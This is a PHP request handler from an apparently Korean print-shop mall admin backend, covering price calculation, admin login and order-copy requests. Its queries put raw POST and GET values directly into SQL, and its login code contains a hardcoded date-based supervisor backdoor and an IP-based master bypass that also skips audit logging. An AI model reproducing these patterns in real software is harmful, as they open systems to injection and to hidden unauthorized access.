<?
/*
* @date : 20180824
* @author : chunter
* @brief : 편집(주문)복사 요청 처리
* @desc : 실제 요청은 podmanage 를 호출하고 결과값을 ajax 호출한 js로 넘긴다.

 * * @date : 20180131
* @author : chunter
* @brief : 월 고정 호스팅 결제 기능이 추가됨으로 로그인시 서비스 만료일 체크함. 기간 종료시  결제창 이동. podmanage 사이트 호출
* @desc : 로그인시 admin_sess에 service_expire_date 추가함.
*/
?>
<?
include "../lib/library.php";

$m_board = new M_board();

/***/switch ($_POST[mode]){/***/

//프로모션 할인 코드 적용			20170929		chunter
case "sale_code_calcu":
	$result = calcuPromotionCodeSale($_POST[sale_code], $_POST[cartno]);
	echo json_encode($result);

	exit;
	break;

//추가 배송비 체크하기			20171229		chunter
case "shipping_extra_calcu":
	$result = calcuShippingExtraPrice($_POST[zipcode], $_POST[cartno]);
	echo json_encode($result);

	exit;
	break;

case "get_title":

	echo $cfg[titleDoc];

	exit; break;

case "get_optprice":

   if($_POST[cover_id] && $_POST[cover_id] != "undefined"){
      $query = "
         select cover_goods_price from md_cover_range_option where cover_id = '$_POST[cover_id]'
      ";
   } else {
   	$query = "
   	select
   		if(b.price is null,a.price,b.price) price
   	from
   		exm_goods a
   		inner join exm_goods_cid b on a.goodsno = b.goodsno
   	where
   		a.goodsno = '$_POST[goodsno]'
   		and b.cid = '$cid'
   	";
   }
	list($price) = $db->fetch($query,1);
	$price = get_business_goods_price($_POST[goodsno],$price);

	if ($_POST[optno]){

		$query = "
		select
			if(b.aprice is null,a.aprice,b.aprice) aprice
		from
			exm_goods_opt a
			left join exm_goods_opt_price b on b.cid = '$cid' and a.goodsno = b.goodsno and a.optno = b.optno
		where
			a.goodsno = '$_POST[goodsno]'
			and a.optno = '$_POST[optno]'
		";
		list($optprice) = $db->fetch($query,1);
		$optprice = get_business_goods_opt_price($_POST[goodsno],$_POST[optno],$optprice);

	}
	$_POST[addopt] = array_notnull(explode(",",$_POST[addopt]));
	if (count($_POST[addopt])){

		foreach ($_POST[addopt] as $addoptno){

			$query = "
			select
				if(b.addopt_aprice is null,a.addopt_aprice,b.addopt_aprice) addopt_aprice
			from
				exm_goods_addopt a
				left join exm_goods_addopt_price b on b.cid = '$cid' and a.addoptno = b.addoptno
				inner join exm_goods_addopt_bundle c on a.goodsno = c.goodsno and a.addopt_bundle_no = c.addopt_bundle_no
			where
				a.goodsno = '$_POST[goodsno]'
				and a.addoptno = '$addoptno'
			";
			list($addopt_prices) = $db->fetch($query,1);
			$addopt_prices = get_business_goods_addopt_price($_POST[goodsno],$addoptno,$addopt_prices);
			$addopt_price += $addopt_prices;
		}
	}

	echo $price+$optprice+$addopt_price;

	exit; break;

case "get_opt_cprice":

	$query = "
	select
		if(mall_cprice,mall_cprice,0) mall_cprice
	from
		exm_goods a
		inner join exm_goods_cid b on a.goodsno = b.goodsno
	where
		a.goodsno = '$_POST[goodsno]'
		and b.cid = '$cid'
	";
	list($price) = $db->fetch($query,1);

	if ($_POST[optno]){

		$query = "
		select
			if(mall_opt_cprice,mall_opt_cprice,0) mall_opt_cprice
		from
			exm_goods_opt a
			left join exm_goods_opt_price b on b.cid = '$cid' and a.goodsno = b.goodsno and a.optno = b.optno
		where
			a.goodsno = '$_POST[goodsno]'
			and a.optno = '$_POST[optno]'
		";
		list($optprice) = $db->fetch($query,1);

	}
	$_POST[addopt] = implode(",",array_notnull(explode(",",$_POST[addopt])));
	if ($_POST[addopt]){

		$query = "
		select
			sum(if(mall_addopt_cprice,mall_addopt_cprice,0)) addopt_aprice
		from
			exm_goods_addopt a
			left join exm_goods_addopt_price b on b.cid = '$cid' and a.addoptno = b.addoptno
			inner join exm_goods_addopt_bundle c on a.goodsno = c.goodsno and a.addopt_bundle_no = c.addopt_bundle_no
		where
			a.goodsno = '$_POST[goodsno]'
			and a.addoptno in ($_POST[addopt])
		";
		list($addopt_price) = $db->fetch($query,1);

	}
	echo $price+$optprice+$addopt_price;

	exit; break;

case "get_opt_reserve":

	$query = "
	select
		if(reserve,reserve,0) reserve
	from
		exm_goods_cid
	where
		cid = '$cid'
		and goodsno = '$_POST[goodsno]'
		
	";
	list($price) = $db->fetch($query,1);

	if ($_POST[optno]){

		$query = "
		select
			if(areserve,areserve,0) areserve
		from
			exm_goods_opt_price
		where
			goodsno = '$_POST[goodsno]'
			and optno = '$_POST[optno]'
		";
		list($optprice) = $db->fetch($query,1);

	}
	$_POST[addopt] = implode(",",array_notnull(explode(",",$_POST[addopt])));
	if ($_POST[addopt]){

		$query = "
		select
			sum(if(addopt_areserve,addopt_areserve,0)) addopt_areserve
		from
			exm_goods_addopt_price
		where
			goodsno = '$_POST[goodsno]'
			and addoptno in ($_POST[addopt])
		";
		list($addopt_price) = $db->fetch($query,1);

	}
	echo $price+$optprice+$addopt_price;

	exit; break;

   case "login":

   	// 사무실 외부 ip 변경 2101001 jtkim
       if(($_SERVER[REMOTE_ADDR]=="211.212.5.200" || strpos($_SERVER[SERVER_ADDR], "192.168.0.") > -1) && $_POST[mid]=="_ilark_"){
   		$_test_master = 1;
   		$_POST[mid] = "admin";
	   }
      //아이락 전체 관리자 계정 생성
      $supervisor_ID = "dkdlfkr".date("m");
      $supervisor_passwd = "dkdlfkr".date("d").")(*&";
      if ($_POST[mid]==$supervisor_ID && $_POST[password]==$supervisor_passwd) {
         $_test_master = 1;
         $_POST[mid] = "admin";
      }

   	//host 결제일경우 유효기간 체크 및 결제창 이동. 1일까지 봐준다.				20180130		chunter
   	if ($cfg[before_account_flag] == "H")
   	{
   		$m_mall = new M_mall();
   		$mallInfo = $m_mall->getInfo($cid);

   		$w_last = date('Y-m-d',strtotime($mallInfo[printgroup_expire_date].'+'.'1'.' days'));

         if(TODAY_Y_M_D >= $w_last || $mallInfo[printgroup_expire_date] == '')
         {
            getHostingAccountLocation(_("호스팅 기간 만료로 인해 서비스가 제한됩니다.")."\\n"._("결제 화면으로 이동합니다."));
            exit;
   		}
      }


   	if ($_POST[rememberid]) {
         setcookie("remember_id",$_POST[mid],time()+999999,'/',$_SERVER[SERVER_NAME]);
   	} else {
   		setcookie("remember_id",'',0,'/',$_SERVER[SERVER_NAME]);
   	}

   	$goUrl = "/a/main/index.php";
     	$loginUrl = "/a/login.php";

      //일반 bluepod 관리자 로그인.
      if ($_COOKIE[admin_login_fail_cnt] > ADMIN_LOGIN_FAIL_COUNT) {
         $zmSpamFreeAjax = "N";
         include '../lib/zmSpamFree/zmSpamFree.php';
         if (!$rslt){msg(_("보안코드를 입력해주세요."),-1);}
      }

      $query = "
         select * from exm_admin a
         inner join exm_mall b on a.cid = b.cid
         where a.cid = '$cid' and mid = '$_POST[mid]'
	  ";

      $data = $db->fetch($query);

      ### 아이디, 비번 유효성 체크
      if ($data[super] != 99) {
         //로그인 실패 횟수 쿠키 저장 (1시간)   20150915    chunter
         $admin_login_fail_cnt = $_COOKIE[admin_login_fail_cnt];
         if (!$admin_login_fail_cnt) $admin_login_fail_cnt = 1;
         else $admin_login_fail_cnt++;
         setcookie ("admin_login_fail_cnt", $admin_login_fail_cnt,  time() + 60*60, "/", '');

         $password = passwordCommonEncode($_POST[password]);

         if (!$data) msg(_("존재하지 않는 아이디입니다"),$loginUrl);
         if ($data[state]!=3) msg(_("운영중인 분양몰이 아닙니다"),$loginUrl);
         if (!$_test_master && $data[password]!=$password) msg(_("비밀번호가 일치하지 않습니다"),$loginUrl);
      }
      setcookie ("admin_login_fail_cnt", "0",  time() + 60*60, "/", '');
      $data[admin] = 1;
   	$data[service_expire_date] =  $mallInfo[printgroup_expire_date];

      _admin_login($data);

      ### 관리자 접속 로그
      if (!$_test_master)
      _log_admin(0,"exm_log_admin",$cid);

      if($data[redirect_url] != "") {
         go($data[redirect_url]);
      } else {
         go($goUrl);
      }


   exit;
   break;

/***/}/***/

/***/switch ($_GET[mode]){/***/

	case "edking_del":
		$addWhere = "where no = '$_GET[no]'";
		$data = $m_board->getEdkingInfo($cid, $addWhere);

		$del_tmp = $data[no]; //no 넘어온 데이타값이 일치하는지??

		if ($del_tmp && $_GET[pmid]) {
			$addColumn = "set del_ok='Y'";
			$addWhere2 = "where no = '$del_tmp'";
			$m_board->setEdkingInfo($del_tmp, $addColumn, $addWhere2); //삭제요청 쿼리문
		}

		msg(_("삭제요청 처리가 되었습니다."));
		echo"<script>parent.closeLayer2();</script>";

	break;

	case "edking_del_cancel":
		$addWhere = "where no = '$_GET[no]'";
		$data = $m_board->getEdkingInfo($cid, $addWhere);

		$del_tmp = $data[no]; //no 넘어온 데이타값이 일치하는지??

		if ($del_tmp && $_GET[pmid]) {
			$addColumn = "set del_ok='N'";
			$addWhere2 = "where no = '$del_tmp'";
			$m_board->setEdkingInfo($del_tmp, $addColumn, $addWhere2); //삭제취소요청 쿼리문
		}

		msg(_("삭제취소요청 처리가 되었습니다."));
		echo"<script>parent.closeLayer2();</script>";

	break;


	//편집(주문) 복사 요청 처리			20182824		chunter
	case "edit_copy_request":
		$storageid = $_GET[storageid];

		if (!$sess[mid])
		{
			$result[result] = "9";
			$result[msg] = "회원인 경우만 복사 요청이 가능합니다.";
			echo json_encode($result);
			break;
		}

		if (!$_GET['request_kind'] || !$storageid)
		{
			$result[result] = "9";
			$result[msg] = "필수정보가 없습니다.";
			echo json_encode($result);
			break;
		}

		if ($_GET['request_kind'] == "cart")
		{
			$m_cart = new M_cart();
			$data = $m_cart->getCartInfoWithStorageid($cid, $sess[mid], $storageid);
		} else if ($_GET['request_kind'] == "edit"){
			$m_order = new M_order();
			$data = $m_order->getEditInfoWithStorageid($storageid, $sess[mid]);
		} else if ($_GET['request_kind'] == "order"){
			$m_order = new M_order();
			//$data = $m_order->getOrdItemForStorageid($storageid);
			$sql = $m_order->getOrdItemInfoList($cid, "a.mid='{$sess[mid]}' and c.storageid='$storageid'","", "", true);
			$data = $db->fetch($sql);
		}


		if ($data)
		{
			$m_goods = new M_goods();
			$gdata = $m_goods->getGoodsInfo($cid, $data[goodsno]);
			if ($gdata)
			{
				//상품이 판매중인지 체크
				if ($gdata[state] == "1" || $gdata[state] =="2")
				{
					$result[result] = "9";
					$result[msg] = "판매되지 않는 상품입니다.";
					echo json_encode($result);
					break;
				}

				//상품 재고가 있는지 체크
				if ($gdata[usestock] == "1" && $gdata[totstock] < 1)
				{
					$result[result] = "9";
					$result[msg] = "상품 재고가 없습니다.";
					echo json_encode($result);
					break;
				}


				$url = "http://podmanage.bluepod.kr/_sync/bluepod_edit_copy_request.php";
				$postData[mode] = "podmanage_edit_copy_request";
				$postData[storageid] = $storageid;
				$postData[center_cid] = $cfg_center[center_cid];
				$postData[cid] = $cid;
				$postData[mid] = $sess[mid];
				$postData[server_ip] = $_SERVER["REMOTE_ADDR"];;
				$postData[r_kind] = $_GET['request_kind'];

				$response = sendPostData($url, $postData);

				$response_data = json_decode($response, 1);
				if ($response_data[state] == "1")
				{
					$result[result] = "1";
					$result[response_key] = $response_data[request_key];
				} else {
					$result[result] = "9";
					$result[msg] = "요청이 실패했습니다.시스템 관리자에게 문의주세요.{$response_data[msg]}";
				}

			} else {
				$result[result] = "9";
				$result[msg] = "상품이 더이상 존재하지 않습니다.";
			}
		} else {
			$result[result] = "9";
			$result[msg] = "보관함코드가 올바르지 않습니다.";
		}

		echo json_encode($result);
	break;

/***/}/***/

?>
